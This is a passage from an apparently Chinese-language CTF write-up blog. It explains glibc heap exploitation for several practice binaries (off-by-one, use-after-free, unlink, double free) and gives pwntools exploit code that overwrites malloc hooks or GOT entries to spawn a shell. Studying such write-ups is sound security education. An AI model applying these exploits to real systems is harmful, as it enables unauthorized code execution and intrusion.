</code></pre><p>å¾—åˆ°ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;name?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x28</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x28</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ebp</span> <span class=o>=</span> <span class=n>uu32</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;ebp&#39;</span><span class=p>,</span> <span class=n>ebp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>,</span><span class=n>ebp</span><span class=o>-</span><span class=mh>0x24</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>],</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span><span class=n>ebp</span><span class=o>-</span><span class=mh>0x1c</span><span class=p>,</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span><span class=n>ebp</span><span class=o>-</span><span class=mh>0x2c</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=roarctf_2019_easy_pwn class="relative group">roarctf_2019_easy_pwn <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#roarctf_2019_easy_pwn aria-label=é”šç‚¹>#</a></span></h3><p>æœ¬é¢˜åœ¨ <code>write</code> æ—¶å­˜åœ¨ off_by_one æ¼æ´ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kr>__int64</span> <span class=kr>__fastcall</span> <span class=nf>sub_E26</span><span class=p>(</span><span class=kt>signed</span> <span class=kt>int</span> <span class=n>a1</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>a2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>__int64</span> <span class=n>result</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>a1</span><span class=o>&gt;</span> <span class=p>(</span><span class=kt>signed</span> <span class=kt>int</span><span class=p>)</span><span class=n>a2</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>a2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>a2</span> <span class=o>-</span> <span class=n>a1</span> <span class=o>==</span> <span class=mi>10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nf>LODWORD</span><span class=p>(</span><span class=n>result</span><span class=p>)</span> <span class=o>=</span> <span class=n>a1</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=nf>LODWORD</span><span class=p>(</span><span class=n>result</span><span class=p>)</span> <span class=o>=</span> <span class=n>a1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>å¦‚æœç¼–è¾‘æ—¶è¾“å…¥çš„ <code>size</code> æ¯”åˆ›å»ºæ—¶çš„ <code>size</code> å¤§ 10ï¼Œå°±å¯ä»¥å¤šè¾“å…¥ä¸€ä¸ªå­—èŠ‚ã€‚è¿™å¤šå‡ºæ¥çš„ä¸€ä¸ªå­—èŠ‚å¯ä»¥è¦†ç›–åˆ°ä¸‹ä¸€ä¸ª chunk çš„ <code>chunk_size</code> å­—æ®µï¼Œä»è€Œä¿®æ”¹å…¶å¤§å°ï¼Œé€ æˆå †å—é‡å ã€‚</p><p>é¦–å…ˆè¿ç»­åˆ›å»º 5 ä¸ª <code>chunk</code>ï¼Œå…¶ä¸­ç¬¬ 0 ä¸ªçš„å¤§å°å¿…é¡»ä»¥ <code>8</code> ç»“å°¾ï¼Œå¦åˆ™åªèƒ½æº¢å‡ºåˆ° <code>prev_size</code> è€Œä¸æ˜¯ <code>chunk_size</code>ã€‚ç¼–è¾‘ 0 ä¸­æ•°æ®ï¼Œè§¦å‘ off_by_one æ¡ä»¶æº¢å‡ºä¿®æ”¹ 1 çš„å¤§å°ã€‚éšå <code>free(1)</code> ä½¿å…¶å¯¹åº”å¤§å°çš„ chunk è¿›å…¥ unsorted binï¼Œæ­¤æ—¶ 2 çš„ fd å³æŒ‡å‘ <code>main_arena+88</code>ï¼Œä»è€Œå¯ä»¥æ³„éœ² libcã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x58</span><span class=p>)</span> <span class=c1># 0</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span> <span class=c1># 1</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x58</span><span class=o>+</span><span class=mi>10</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x58</span><span class=o>+</span><span class=s1>&#39;</span><span class=se>\xe1</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span> <span class=c1># 1</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=c1># 2</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;content:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>main_arena</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span> <span class=o>-</span> <span class=mi>88</span>
</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=n>main_arena</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;base&#39;</span><span class=p>,</span> <span class=n>base</span><span class=p>)</span>
</span></span></code></pre></div><p>æ¥ä¸‹æ¥å…ˆç»•è¿‡ fastbin çš„å¤§å°æ£€æŸ¥ï¼Œéšåå‘ fd å†™å…¥ <code>malloc_hook</code> ä¸Šæ–¹çš„åœ°å€åç”³è¯·å›æ¥ï¼Œä»ç”³è¯·åˆ°çš„åœ°å€å‡ºå‘å¡«å…… 11 å­—èŠ‚åå³å¯ç”¨ <code>one_gadget</code> è¦†ç›– <code>__malloc_hook</code>ã€‚ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ <code>one_gadget</code> çš„çº¦æŸæ¡ä»¶å¾—ä¸åˆ°æ»¡è¶³ï¼Œå› æ­¤éœ€è¦å…ˆæ‰§è¡Œ <code>__libc_realloc</code> å¯¹ rsp è¿›è¡Œè°ƒæ•´ã€‚æœ€åç”¨ <code>one_gadget</code> è¦†ç›– <code>__realloc_hook</code>ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span> <span class=c1># 5 (2)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=c1># bypass fastbin check</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span><span class=mh>0x8</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>main_arena</span><span class=o>-</span><span class=mh>0x33</span><span class=p>))</span> <span class=c1># above malloc_hook</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span> <span class=c1># 2</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>)</span> <span class=c1># 6</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0xb</span><span class=p>,</span><span class=n>base</span><span class=o>+</span><span class=mh>0x4526a</span><span class=p>,</span><span class=n>base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;realloc&#39;</span><span class=p>]</span><span class=o>+</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>6</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>),</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=ciscn_2019_n_3 class="relative group">ciscn_2019_n_3 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#ciscn_2019_n_3 aria-label=é”šç‚¹>#</a></span></h3><p>æœ¬é¢˜ <code>do_new</code> å‡½æ•°å…ˆåˆ›å»º <code>0xc</code> çš„ chunkï¼ŒåŒ…å«å¡«å……çš„æ•°å­—ã€å¯¹æ•°å­—çš„æ‰“å°å‡½æ•°å’Œé‡Šæ”¾å‡½æ•°ï¼›è€Œå¦‚æœç”³è¯·çš„æ˜¯ <code>string</code> ç±»å‹ï¼Œä¸”é•¿åº¦ä¸è¶…è¿‡ <code>0x400</code> çš„è¯ï¼Œéšåè¿˜ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ chunkï¼ŒåŒ…å«å­—ç¬¦ä¸²å†…å®¹ã€å¯¹å­—ç¬¦ä¸²çš„æ‰“å°å‡½æ•°å’Œé‡Šæ”¾å‡½æ•°ã€‚</p><p>è€Œåœ¨ <code>do_del</code> ä¸­ï¼Œ<code>free</code> åæ²¡æœ‰æ¸…ç©ºæŒ‡é’ˆï¼Œå­˜åœ¨ uafã€‚å› æ­¤å¯ä»¥å…ˆç”³è¯·ä¸¤ä¸ªå †å—ï¼ˆæ€»å¤§å°å¤§äº <code>0xc</code>ï¼‰ç„¶åä¾æ¬¡é‡Šæ”¾ï¼Œå†ç”³è¯·ä¸€ä¸ªå¤§å°ä¸º <code>0xc</code> çš„å †å—ã€‚é‚£ä¹ˆæ­¤æ—¶å…ˆä¼šæ‹¿å‡º <code>chunk1</code> çš„ <code>0xc</code> è¿™ä¸€å—ï¼Œå†æ‹¿å‡º <code>chunk0</code> çš„ <code>0xc</code> è¿™ä¸€å—ï¼Œåè€…æ˜¯æˆ‘ä»¬å¯å†™çš„ã€‚</p><p>é€šè¿‡é€†å‘å¯çŸ¥ç»“æ„ä½“åç§» 0 å¤„æ˜¯æ‰“å°å‡½æ•°ã€åç§» 4 å¤„æ˜¯é‡Šæ”¾å‡½æ•°ï¼Œé‡Šæ”¾å‡½æ•°çš„å‚æ•°æ˜¯ç»“æ„ä½“æŒ‡é’ˆæœ¬èº«ã€‚é‚£ä¹ˆæˆ‘ä»¬å°† <code>chunk0</code> çš„æ‰“å°å‡½æ•°å†™æˆ <code>sh\x00\x00</code>ï¼ˆæ³¨æ„ 4 å­—èŠ‚ï¼‰ï¼Œé‡Šæ”¾å‡½æ•°ç”¨ <code>system</code> è¦†ç›–ï¼Œé‡Šæ”¾æ—¶å°±ä¼šæ‰§è¡Œ <code>system("sh")</code>ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>index</span><span class=p>,</span><span class=nb>len</span><span class=p>,</span><span class=n>content</span><span class=o>=</span><span class=s1>&#39;a&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;CNote&gt; &#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Index&gt; &#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Type&gt; &#39;</span><span class=p>,</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Length&gt; &#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Value&gt; &#39;</span><span class=p>,</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;CNote&gt; &#39;</span><span class=p>,</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Index&gt; &#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mh>0xc</span><span class=p>,</span><span class=s1>&#39;sh</span><span class=se>\x00\x00</span><span class=s1>&#39;</span><span class=o>+</span><span class=n>p32</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=c1># 0xc from 1, then 0xc from 0</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=hitcon2014_stkof class="relative group">hitcon2014_stkof <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#hitcon2014_stkof aria-label=é”šç‚¹>#</a></span></h3><p>æœ¬é¢˜å…±å››ä¸ªåŠŸèƒ½ï¼šæ·»åŠ ã€è¯»å…¥å†…å®¹ã€åˆ é™¤ã€æ˜¾ç¤ºã€‚å…¶ä¸­è¯»å…¥å†…å®¹å­˜åœ¨å †æº¢å‡ºï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæº¢å‡ºå®ç° unlink æ”»å‡»ã€‚ç¨‹åºä¸­å­˜åœ¨å…¨å±€æ•°ç»„ <code>bag</code>ï¼Œå­˜æ”¾æ‰€æœ‰ chunk çš„ mem æŒ‡é’ˆã€‚</p><p>å…ˆç”³è¯· 3 ä¸ª chunkï¼Œå…¶ä¸­ç¬¬ 1 ä¸ª chunk æ²¡æœ‰ç”¨ï¼Œåªæ˜¯å› ä¸ºå‰ä¸¤ä¸ª chunk ä¸è¿ç»­æ‰€ä»¥æ‰ç”³è¯·çš„ã€‚éšåé€šè¿‡ chunk2 æº¢å‡ºåˆ° chunk3 è¿›è¡Œ unlink æ”»å‡»ï¼Œè¿™æ ·ä¿®æ”¹ <code>bag[2]</code> ç­‰ä»·äºä¿®æ”¹ <code>bag[-1]</code>ï¼Œå¡«å……æ‰ <code>bag[-1]</code> å’Œ <code>bag[0]</code> åï¼Œä»¤ï¼š</p><ul><li><code>bag[1] = elf.got['free']</code></li><li><code>bag[2] = elf.got['fflush']</code>ï¼Œ<code>fflush</code> å¯ä»¥æ˜¯ä»»æ„å·²è°ƒç”¨çš„ libc å‡½æ•°</li><li><code>bag[3] = elf.got['atoi']</code></li></ul><p>æ­¤æ—¶æˆ‘ä»¬ <code>edit(1)</code> å†™å…¥ <code>elf.plt['puts']</code> å³å¯åŠ«æŒ <code>free</code> å‡½æ•°åˆ° <code>puts</code>ï¼Œé‚£ä¹ˆè°ƒç”¨ <code>delete(2)</code> å°±ä¼šæ‰“å°å‡º <code>fflush</code> åœ°å€ï¼Œä»è€Œæ³„éœ² libcã€‚æœ€å <code>edit(3)</code> å†™å…¥ <code>system</code> åœ°å€ï¼ŒåŠ«æŒ <code>atoi</code> åˆ° <code>system</code>ï¼Œè¿™æ˜¯å› ä¸ºåœ¨ç¨‹åºè¯»å…¥æŒ‡ä»¤æ—¶ä¼šè°ƒç”¨ <code>atoi(&amp;nptr)</code>ï¼Œæˆ‘ä»¬è¾“å…¥çš„ <code>nptr</code> åªéœ€è¦æ˜¯ <code>/bin/sh</code> å³å¯ getshellã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;OK</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>index</span><span class=p>,</span><span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>content</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;OK</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>bag</span> <span class=o>=</span> <span class=mh>0x602140</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fd</span> <span class=o>=</span> <span class=n>bag</span><span class=o>+</span><span class=mh>0x10</span><span class=o>-</span><span class=mh>0x18</span>
</span></span><span class=line><span class=cl><span class=n>bk</span> <span class=o>=</span> <span class=n>bag</span><span class=o>+</span><span class=mh>0x10</span><span class=o>-</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x80</span><span class=p>,</span><span class=n>fd</span><span class=p>,</span><span class=n>bk</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x80</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>flat</span><span class=p>(</span><span class=mh>0x80</span><span class=p>,</span><span class=mh>0x90</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># bag[2] &lt;-&gt; bag[-1]</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;free&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;fflush&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;atoi&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=c1># puts(GOT[fflush])</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;OK</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fflush</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;fflush&#39;</span><span class=p>,</span><span class=n>fflush</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>system</span><span class=p>,</span><span class=n>binsh</span> <span class=o>=</span> <span class=n>ret2libc</span><span class=p>(</span><span class=n>fflush</span><span class=p>,</span><span class=s1>&#39;fflush&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>system</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span></code></pre></div><h2 id=part-iii class="relative group">Part III <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#part-iii aria-label=é”šç‚¹>#</a></span></h2><h3 id=sleepyholder_hitcon_2016 class="relative group">sleepyHolder_hitcon_2016 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#sleepyholder_hitcon_2016 aria-label=é”šç‚¹>#</a></span></h3><p>è¿™é“é¢˜å…è®¸ä¿å­˜ small/big/huge secretï¼Œå…¶ä¸­ huge åªèƒ½ä¿å­˜ä¸€æ¬¡ï¼Œä¸èƒ½åˆ é™¤å’Œä¿®æ”¹ï¼Œå¹¶ä¸”åœ¨ä¿å­˜äº†ä¸€ä¸ª small/big ä¹‹åå°±ä¸èƒ½å†ä¿å­˜æ–°çš„ small/big äº†ï¼Œåªèƒ½ renewã€‚</p><p>æ˜¾ç„¶è¿™ä¸ª huge å°±æ˜¯æˆ‘ä»¬æ¼æ´åˆ©ç”¨çš„æ ¸å¿ƒã€‚å®é™…ä¸Šï¼Œhuge çš„èŒƒå›´å±äº large binï¼Œåœ¨ç”³è¯·è¿™ä¹ˆå¤§çš„ chunk æ—¶å¦‚æœ unsorted bin ä¸­æ²¡æœ‰æ»¡è¶³æ¡ä»¶çš„ï¼Œå°±ä¼šè§¦å‘ <code>malloc_consolidate()</code>ï¼Œä½¿ fastbin ä¸­çš„ chunk åˆå¹¶è¿›å…¥ unsorted binï¼Œæœ€ç»ˆæ ¹æ®åˆå¹¶åçš„å¤§å°è¿›å…¥ small bin æˆ– large binã€‚é‚£ä¹ˆæˆ‘ä»¬ä¸å¦¨å…ˆç”³è¯·ä¸€ä¸ª smallï¼Œç„¶åç”³è¯· big é˜²æ­¢ small è¢«é‡Šæ”¾æ—¶ä¸ top chunk åˆå¹¶ï¼Œå†é‡Šæ”¾ smallã€‚æ­¤æ—¶ small è¿›å…¥ fastbinï¼Œå†ç”³è¯· huge å³å¯è®© small è¿›å…¥åˆ° small binã€‚</p><p>ç”±äºè¿™æ—¶ small å·²ç»ä¸å¤„äº fastbin é“¾è¡¨å¤´äº†ï¼Œæ‰€ä»¥å†æ¬¡é‡Šæ”¾å¹¶ä¸ä¼šå‡ºé”™ï¼Œé€ æˆ double freeã€‚è¿™æ ·ä¹‹ååœ¨ small å†…ä¼ªé€  chunk å¹¶ unlink åŠ«æŒ GOT è¡¨å³å¯ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># 1-&gt;fastbin</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=c1># consolidate,1-&gt;unsorted bin-&gt;smallbin</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>small_secret</span> <span class=o>=</span> <span class=mh>0x6020d0</span>
</span></span><span class=line><span class=cl><span class=n>fd</span> <span class=o>=</span> <span class=n>small_secret</span> <span class=o>-</span> <span class=mh>0x18</span>
</span></span><span class=line><span class=cl><span class=n>bk</span> <span class=o>=</span> <span class=n>small_secret</span> <span class=o>-</span> <span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x21</span><span class=p>,</span><span class=n>fd</span><span class=p>,</span><span class=n>bk</span><span class=p>,</span><span class=mh>0x20</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ?,big,huge,small,big_flag,huge_flag,small_flag</span>
